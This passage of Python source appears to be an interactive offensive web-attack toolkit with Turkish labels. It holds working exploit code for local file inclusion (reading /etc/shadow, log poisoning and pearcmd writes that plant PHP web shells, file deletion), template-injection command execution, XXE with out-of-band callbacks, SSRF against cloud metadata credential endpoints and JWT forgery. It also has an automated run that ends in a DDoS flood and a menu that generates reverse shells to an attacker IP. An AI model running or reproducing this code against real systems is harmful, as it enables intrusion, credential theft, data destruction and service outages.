        yaz("slack spam", "uy"); return True


# lfi
class LFI:
    paths = ["/etc/passwd","/etc/shadow","/proc/self/environ","/proc/self/cmdline",
             "../../../../etc/passwd","....//....//....//etc/passwd",
             "..%2f..%2f..%2fetc%2fpasswd","/var/www/html/config.php",
             "/var/www/html/wp-config.php","/var/log/apache2/access.log",
             "/var/log/nginx/access.log","/proc/self/fd/0","/proc/self/fd/1","/proc/self/fd/2"]
    wraps = [("php://filter/convert.base64-encode/resource=","b64"),
             ("php://filter/read=string.rot13/resource=","rot13"),
             ("php://filter/convert.iconv.utf-8.utf-16/resource=","iconv"),
             ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+","data"),
             ("expect://id","expect"),("zip://","zip"),("phar://","phar")]

    def __init__(self, h, cb=None): self.h = h; self.cb = cb

    def oku(self, u, p):
        r = self.h.get(u + quote(p, safe=""))
        if r and r.status_code == 200:
            if "root:" in r.text or "daemon:" in r.text:
                yaz("passwd okundu", "hit"); print(r.text[:800]); return r.text
            yaz(f"{len(r.text)}b", "i"); return r.text
        return None

    def wrap(self, u, p="/etc/passwd"):
        for w, tip in self.wraps:
            r = self.h.get(u + quote(w + p, safe=""))
            if r and r.status_code == 200 and len(r.text) > 20:
                yaz(f"wrapper {tip}", "hit")
                if tip == "b64":
                    try: print(base64.b64decode(r.text.strip()).decode(errors="ignore")[:400])
                    except Exception: print(r.text[:400])
                else: print(r.text[:400])
                return w
        yaz("wrapper yok", "er"); return None

    def logpoison(self, u, p="/var/log/apache2/access.log"):
        self.h.get(u, h={"User-Agent": "<?php system($_GET['c']); ?>"})
        r = self.h.get(u + quote(p, safe="") + "&c=id")
        if r and r.status_code == 200 and ("uid=" in r.text or "gid=" in r.text):
            yaz("log poison rce", "hit"); print(r.text[:400]); return True
        yaz("log poison yok", "uy"); return False

    def pear(self, u):
        ws = "<?php system($_GET['c']); ?>"
        self.h.get(u + "/usr/local/lib/php/pearcmd.php&+config-create+/<?=" + quote(ws, safe="") + ">+/var/www/html/shell.php")
        r = self.h.get(u.replace("/index.php", "/shell.php") + "?c=id")
        if r and r.status_code == 200 and "uid=" in r.text:
            yaz("pearcmd rce", "hit"); return True
        yaz("pearcmd yok", "uy"); return False

    def chain(self, u):
        p = "php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
        r = self.h.get(u + quote(p, safe="") + "&c=id")
        if r and r.status_code == 200 and ("uid=" in r.text or "gid=" in r.text):
            yaz("filter chain rce", "hit"); return True
        yaz("filter chain yok", "uy"); return False

    def sil(self, u, p):
        for x in [u+quote(p,safe="")+s for s in ["&delete=1","&action=delete","&do=unlink",
                                                  "&remove=1","&op=delete","&cmd=delete"]]:
            r = self.h.get(x)
            if r and r.status_code == 200 and any(k in r.text.lower()
                for k in ("deleted","silindi","removed","success","ok")):
                yaz(f"silindi {x}", "hit"); return True
        yaz("silinemedi", "er"); return False


# ssti
class SSTI:
    probe = [("${7*7}","49"),("{{7*7}}","49"),("{{7*'7'}}","7777777"),
             ("#{7*7}","49"),("<%= 7*7 %>","49"),("{7*7}","49"),
             ("${{7*7}}","49"),("@(7*7)","49")]
    jinja = ["{{ ''.__class__.__mro__[1].__subclasses__() }}",
             "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
             "{{ lipsum.__globals__['os'].popen('id').read() }}",
             "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
             "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}"]
    twig = ["{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}"]
    frk = ["<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"]

    def __init__(self, h): self.h = h

    def tara(self, u):
        q = parse_qs(urlparse(u).query, keep_blank_values=True)
        if not q: yaz("param yok", "er"); return None
        for p in q:
            for pay, bekle in self.probe:
                x = re.sub(rf"{re.escape(p)}=[^&]*", f"{p}={quote(pay)}", u)
                r = self.h.get(x)
                if r and bekle in r.text and "7*7" not in r.text:
                    yaz(f"ssti {p} {pay!r}", "hit")
                    motor = "jinja2"
                    if pay.startswith("${"): motor = "freemarker"
                    if pay.startswith("#{"): motor = "ruby"
                    if pay.startswith("<%"): motor = "erb"
                    return {"p":p,"pay":pay,"motor":motor,"u":x}
        yaz("ssti yok", "er"); return None

    def rce(self, u, p, motor="jinja2", cmd="id"):
        h = {"jinja2":self.jinja,"twig":self.twig,"freemarker":self.frk}
        for pay in h.get(motor, self.jinja):
            if "id" in pay: pay = pay.replace("id", cmd)
            x = re.sub(rf"{re.escape(p)}=[^&]*", f"{p}={quote(pay)}", u)
            r = self.h.get(x)
            if r and ("uid=" in r.text or "gid=" in r.text or cmd[:3] in r.text):
                yaz(f"ssti rce {motor}", "hit"); print(r.text[:400]); return r.text
        yaz("ssti rce yok", "er"); return None


# xxe
class XXE:
    pay = ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
           '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&x;</r>']

    def __init__(self, h, cb=None): self.h = h; self.cb = cb

    def oku(self, u, p="xml"):
        for x in self.pay:
            r = self.h.post(u, data={p:x}, h={"Content-Type":"application/xml"})
            if r and r.status_code == 200:
                if "root:" in r.text or "daemon:" in r.text:
                    yaz("xxe okundu", "hit"); print(r.text[:500]); return r.text
                try:
                    d = base64.b64decode(r.text.strip()).decode(errors="ignore")
                    if "<?php" in d or "root:" in d:
                        yaz("xxe b64", "hit"); print(d[:500]); return d
                except Exception: pass
        yaz("xxe yok", "er"); return None

    def oob(self, u, p="xml"):
        if not self.cb: yaz("cb yok", "er"); return None
        t = self.cb.yeni(); host = self.cb.host
        dtd = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://{host}/{t}.dtd">%remote;]><r/>'
        self.h.post(u, data={p:dtd}, h={"Content-Type":"application/xml"})
        if self.cb.bekle(t, 8): yaz("xxe oob", "hit"); return True
        yaz("xxe oob yok", "uy"); return None


# ssrf
class SSRF:
    targets = ["http://169.254.169.254/latest/meta-data/",
               "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
               "http://169.254.169.254/latest/user-data",
               "http://metadata.google.internal/computeMetadata/v1/",
               "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
               "http://metadata.tencentyun.com/latest/meta-data/",
               "http://100.100.100.200/latest/meta-data/",
               "http://127.0.0.1:80/","http://127.0.0.1:8080/","http://localhost:22/",
               "file:///etc/passwd","gopher://127.0.0.1:6379/_INFO","dict://127.0.0.1:6379/INFO"]

    def __init__(self, h, cb=None): self.h = h; self.cb = cb

    def tara(self, u, p=None):
        yaz(f"ssrf {u}", "i")
        for t in self.targets:
            x = re.sub(rf"{re.escape(p)}=[^&]*", f"{p}={quote(t)}", u) if p else u + quote(t, safe="")
            r = self.h.get(x, redir=False)
            if r and r.status_code in (200,301,302) and len(r.text) > 20:
                if any(k in r.text for k in ("ami-id","instance-id","AccessKeyId","root:",
                                              "computeMetadata","redis_version","SSH-")):
                    yaz(f"ssrf {t}", "hit"); print(r.text[:400])
                    return {"t":t, "r":r.text[:1000]}
        yaz("ssrf yok", "er"); return None


# jwt
class JWT:
    weak = ["secret","password","123456","jwt","key","admin","test","qwerty",
            "your-256-bit-secret","changeme","default","jwt-secret","hs256",
            "supersecret","mysecret","token","api","auth","jwtkey","private",
            "signature","mykey","s3cr3t","p@ssw0rd","letmein","root","guest","demo"]

    def __init__(self, h): self.h = h

    def parse(self, t):
        try:
            p = t.split(".")
            if len(p) != 3: return None
            h = json.loads(base64.urlsafe_b64decode(p[0] + "="*(-len(p[0])%4)))
            b = json.loads(base64.urlsafe_b64decode(p[1] + "="*(-len(p[1])%4)))
            return {"h":h,"p":b,"sig":p[2]}
        except Exception as e:
            yaz(f"parse {e}", "er"); return None

    def none(self, t):
        a = self.parse(t)
        if not a: return None
        out = []
        for alg in ("none","None","NONE","nOnE"):
            h = dict(a["h"]); h["alg"] = alg
            hb = base64.urlsafe_b64encode(json.dumps(h, separators=(",",":")).encode()).rstrip(b"=").decode()
            pb = base64.urlsafe_b64encode(json.dumps(a["p"], separators=(",",":")).encode()).rstrip(b"=").decode()
            out.append(f"{hb}.{pb}.")
        return out

    def brute(self, t, lst=None):
        if not HAVE_JWT: yaz("pyjwt yok", "er"); return None
        for k in (lst or self.weak):
            try:
                pyjwt.decode(t, k, algorithms=["HS256"])
                yaz(f"anahtar {k!r}", "hit"); return k
            except Exception: continue
        yaz("zayif anahtar yok", "er"); return None

    def kid(self, t):
        a = self.parse(t)
        if not a: return None
        out = []
        for kid in ["/dev/null","../../../../dev/null","../../../etc/passwd"]:
            h = dict(a["h"]); h["kid"] = kid
            hb = base64.urlsafe_b64encode(json.dumps(h, separators=(",",":")).encode()).rstrip(b"=").decode()
            pb = base64.urlsafe_b64encode(json.dumps(a["p"], separators=(",",":")).encode()).rstrip(b"=").decode()
            im = base64.urlsafe_b64encode(hmac.new(b"", f"{hb}.{pb}".encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
            out.append(f"{hb}.{pb}.{im}")
        return out


def orkestra(h, cb, u):
    yaz("full auto", "uy")
    out = {}; t0 = time.time()

    def _try(ad, fn):
        yaz(f"{ad}", "i")
        try: out[ad] = fn()
        except Exception as e: yaz(f"{ad}: {e}", "er"); out[ad] = str(e)

    _try("sqli", lambda: SQLI(h, cb).tara(u))
    _try("cmdi", lambda: CMDI(h, cb).tara(u, "id"))
    _try("ssti", lambda: (lambda d: (d and SSTI(h).rce(d["u"], d["p"], d["motor"])))(SSTI(h).tara(u)))
    _try("lfi",  lambda: next((p for p in LFI(h, cb).paths if LFI(h, cb).oku(u, p)), None))
    _try("ssrf", lambda: SSRF(h, cb).tara(u))
    _try("xxe",  lambda: XXE(h, cb).oku(u))

    yaz("ddos 30s", "i")
    try:
        DDoS(u, 200, 30).basla(("flood",))
        out["ddos"] = "30s"
    except Exception as e: yaz(f"ddos: {e}", "er")

    os.makedirs("reports", exist_ok=True)
    f = f"reports/vornexx_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(f, "w", encoding="utf-8") as fp:
        json.dump({"url":u,"sonuc":out,"oob":cb.hits if cb else []},
                  fp, indent=2, ensure_ascii=False, default=str)
    yaz(f"rapor {f}", "ok")
    print(f"\n{Fore.CYAN}=== {time.time()-t0:.0f}s ===")
    for k, v in out.items(): print(f"  {k}: {str(v)[:120] if v else 'yok'}")


class Stool:
    def __init__(self):
        yaz("proxy yukleniyor...", "i")
        self.px = Proxy(aktif=True)
        self.h = HTTP(10, 2, self.px)
        self.cb = None
        self.run = True
        banner(self.px.stat())
        self.dongu()

    def dongu(self):
        while self.run:
            menü()
            try: c = input(f"{Fore.YELLOW}secim: {Fore.WHITE}").strip()
            except (EOFError, KeyboardInterrupt): return
            try:
                if c == "1": self._sqli()
                elif c == "2": self._cmdi()
                elif c == "3": self._ddos()
                elif c == "4": self._tok()
                elif c == "5": self._lfi()
                elif c == "6": self._ssti()
                elif c == "7": self._xxe()
                elif c == "8": self._ssrf()
                elif c == "9": self._jwt()
                elif c == "10": self._shell()
                elif c == "11": self._cbmenu()
                elif c == "12": self._pxmenu()
                elif c == "13": self._full()
                elif c == "14": self._ayar()
                elif c == "0": self.run = False
            except KeyboardInterrupt: print(f"\n{Fore.YELLOW}kesildi")
            banner(self.px.stat())

    def _sqli(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        s = SQLI(self.h, self.cb)
        r = s.tara(u)
        if r and r.get("tip") in ("boolean","time") and input("dump? e/h: ").lower() == "e":
            s.dump(u)
        input(f"{Fore.CYAN}enter...")

    def _cmdi(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        cmd = input("komut (id): ").strip() or "id"
        c = CMDI(self.h, self.cb)
        c.tara(u, cmd)
        if input("revshell? e/h: ").lower() == "e":
            ip = input("ip: ").strip()
            p = input("port (4444): ").strip() or "4444"
            d = input("dil (bash): ").strip() or "bash"
            if ip: c.rev(u, ip, p, d)
        input(f"{Fore.CYAN}enter...")

    def _ddos(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        try: n = int(input("worker (300): ").strip() or "300")
        except: n = 300
        try:
            x = input("sure sn (bos=sinirsiz): ").strip()
            sn = int(x) if x else None
        except: sn = None
        v = input("vektor flood/slow/rudy/h2: ").strip() or "flood,slow"
        DDoS(u, n, sn).basla(tuple(x.strip() for x in v.split(",")))
        input(f"{Fore.CYAN}enter...")

    def _tok(self):
        x = input(f"{Fore.WHITE}token/webhook: {Fore.YELLOW}").strip()
        if x: Tokens(self.h).calistir(x)
        input(f"{Fore.CYAN}enter...")

    def _lfi(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        l = LFI(self.h, self.cb)
        print("[a]oku [b]wrap [c]logpoison [d]pearcmd [e]chain [f]sil")
        a = input("alt: ").strip()
        if a == "a": l.oku(u, input("dosya (/etc/passwd): ").strip() or "/etc/passwd")
        elif a == "b": l.wrap(u)
        elif a == "c": l.logpoison(u)
        elif a == "d": l.pear(u)
        elif a == "e": l.chain(u)
        elif a == "f":
            d = input("dosya: ").strip()
            if d: l.sil(u, d)
        input(f"{Fore.CYAN}enter...")

    def _ssti(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        s = SSTI(self.h)
        d = s.tara(u)
        if d:
            k = input("komut (id): ").strip() or "id"
            s.rce(d["u"], d["p"], d["motor"], k)
        input(f"{Fore.CYAN}enter...")

    def _xxe(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        p = input("xml param (xml): ").strip() or "xml"
        x = XXE(self.h, self.cb)
        x.oku(u, p)
        if self.cb and input("oob? e/h: ").lower() == "e": x.oob(u, p)
        input(f"{Fore.CYAN}enter...")

    def _ssrf(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        p = input("param (auto): ").strip() or None
        SSRF(self.h, self.cb).tara(u, p)
        input(f"{Fore.CYAN}enter...")

    def _jwt(self):
        t = input(f"{Fore.WHITE}jwt: {Fore.YELLOW}").strip()
        if not t: return
        j = JWT(self.h)
        a = j.parse(t)
        if a: print(json.dumps(a, indent=2, ensure_ascii=False))
        print("[a]none [b]hs256 [c]kid")
        c = input("alt: ").strip()
        if c == "a":
            for x in (j.none(t) or []): print(x)
        elif c == "b": j.brute(t)
        elif c == "c":
            for x in (j.kid(t) or []): print(x)
        input(f"{Fore.CYAN}enter...")

    def _shell(self):
        ip = input(f"{Fore.WHITE}ip: {Fore.YELLOW}").strip()
        p = input("port (4444): ").strip() or "4444"
        if not ip: return
        diller = ["bash","bash-nc","sh","python3","perl","php","ruby","socat",
                  "ps1","ps1-b64","nc-mkfifo","nc-mkfifo2","nodejs","java","lua"]
        for d in diller:
            s = shell(d, ip, p)
            if s: print(f"\n{Fore.YELLOW}# {d}{Fore.WHITE}\n{s}")
        input(f"{Fore.CYAN}enter...")

    def _cbmenu(self):
        if self.cb:
            yaz(f"cb port={self.cb.port} hit={len(self.cb.hits)}", "i")
        else:
            p = input("port (8888): ").strip() or "8888"
            hh = input(f"public host (127.0.0.1:{p}): ").strip()
            self.cb = Callback(int(p))
            self.cb.host = hh or f"127.0.0.1:{p}"
            self.cb.basla()
        input(f"{Fore.CYAN}enter...")

    def _pxmenu(self):
        banner(self.px.stat())
        print("[1] yenile [2] protokol [3] aktif/kapali [4] olu temizle [5] ilk 10 [0] geri")
        c = input("secim: ").strip()
        if c == "1":
            self.px.yenile(); yaz(f"{len(self.px.list)} toplam / {self.px.canli()} saglam", "ok")
        elif c == "2":
            p = input("protokoller: ").strip()
            if p: self.px.prot = tuple(x.strip() for x in p.split(",") if x.strip())
        elif c == "3":
            self.px.aktif = not self.px.aktif
            yaz(f"{'aktif' if self.px.aktif else 'kapali'}", "ok")
        elif c == "4":
            self.px.olu.clear(); yaz("temiz", "ok")
        elif c == "5":
            for p in self.px.list[:10]: print(f"  {p}")
        input(f"{Fore.CYAN}enter...")

    def _ayar(self):
        banner(self.px.stat())
        print(f"[1] timeout ({self.h.tmo}) [2] retry ({self.h.tekrar}) [3] cb host [0] geri")
        c = input("secim: ").strip()
        if c == "1":
            try: self.h.tmo = int(input("timeout: ")); yaz(f"{self.h.tmo}", "ok")
            except: pass
        elif c == "2":
            try: self.h.tekrar = int(input("retry: ")); yaz(f"{self.h.tekrar}", "ok")
            except: pass
        elif c == "3":
            hh = input("host:port: ").strip()
            if self.cb and hh: self.cb.host = hh; yaz(f"{hh}", "ok")
        input(f"{Fore.CYAN}enter...")

    def _full(self):
        u = input(f"{Fore.WHITE}url: {Fore.YELLOW}").strip()
        if not u: return
        if input("emin misin? e/h: ").lower() != "e": return
        if not self.cb: self.cb = Callback(); self.cb.basla()
        orkestra(self.h, self.cb, u)
        input(f"{Fore.CYAN}enter...")


if __name__ == "__main__":
    try: Stool()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}kesildi")
        sys.exit(0)